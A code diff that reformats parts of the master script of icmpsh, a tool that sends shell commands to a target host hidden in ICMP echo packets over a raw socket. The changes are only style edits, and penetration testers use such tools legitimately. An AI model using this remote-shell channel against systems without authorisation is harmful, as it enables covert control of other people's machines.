@@ -25,6 +25,7 @@ import socket
 import subprocess
 import sys
 
+
 def setNonBlocking(fd):
     """
     Make a file descriptor non-blocking
@@ -35,6 +36,7 @@ def setNonBlocking(fd):
     flags = fcntl.fcntl(fd, fcntl.F_GETFL)
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
+
 
 def main(src, dst):
     if subprocess.mswindows:
@@ -56,9 +58,13 @@ def main(src, dst):
     # A special option is set on the socket so that IP headers are included
     # with the returned data
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sock = socket.socket(
+            socket.AF_INET,
+            socket.SOCK_RAW,
+            socket.IPPROTO_ICMP)
     except socket.error:
-        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
+        sys.stderr.write(
+            'You need to run icmpsh master with administrator privileges\n')
         sys.exit(1)
 
     sock.setblocking(0)
@@ -80,7 +86,7 @@ def main(src, dst):
         cmd = ''
 
         # Wait for incoming replies
-        if sock in select.select([ sock ], [], [])[0]:
+        if sock in select.select([sock], [], [])[0]:
             buff = sock.recv(4096)
 
             if 0 == len(buff):
@@ -93,7 +99,8 @@ def main(src, dst):
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
+            if ippacket.get_ip_dst() == src and ippacket.get_ip_src(
+            ) == dst and 8 == icmppacket.get_icmp_type():
                 # Get identifier and sequence number
                 ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
@@ -105,7 +112,7 @@ def main(src, dst):
                 # Parse command from standard input
                 try:
                     cmd = sys.stdin.readline()
-                except:
+                except BaseException:
                     pass
 
                 if cmd == 'exit\n':
@@ -122,11 +129,13 @@ def main(src, dst):
                 icmp.set_icmp_cksum(0)
                 icmp.auto_checksum = 1
 
-                # Have the IP packet contain the ICMP packet (along with its payload)
+                # Have the IP packet contain the ICMP packet (along with its
+                # payload)
                 ip.contains(icmp)
 
                 # Send it to the target host
                 sock.sendto(ip.get_packet(), (dst, 0))
+
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
